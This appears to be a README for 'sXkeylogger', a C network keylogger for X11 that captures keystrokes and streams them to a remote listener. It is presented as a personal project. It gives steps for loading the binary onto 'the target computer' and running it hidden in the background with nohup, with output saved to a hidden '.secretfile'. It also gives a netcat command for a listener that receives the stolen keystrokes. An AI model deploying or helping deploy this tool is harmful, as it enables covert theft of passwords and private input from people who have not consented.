# sxkeylogger
sXkeylogger is a simple network keylogger for X11 systems written in C that captures local keystrokes and sends them to a listener at a specified address & port & can also store them in a text file. This is a personal project.

## Usage
Edit the macros at the top of the source code file to configure network details. Compile with `make`.
After loading the binary to the target computer, run in the background with
```
nohup ./a.out >/dev/null 2>&1 &
```
You can save stdout to a text file with
```
nohup ./a.out > .secretfile 2>&1 &
```

### Listener
The keylogger will send logged information live to address & port specified in the source file before compilation. A listener device (such as a computer, an android phone with termux or a raspberry pi) will have to be listening on the specified port. To start a simple listener, you can use netcat like so:
```
nc -lkp $PORT
```

## Features
* Sends keystrokes live to a listener
* Stores keystroke on a text file
* Resource efficient
* Few dependencies (only X11 libary)
* Easy to build & run

## Limitations (TODO)
* Limited keystroke capturing
* Only works on machines running X11
* Doesn't specify active window
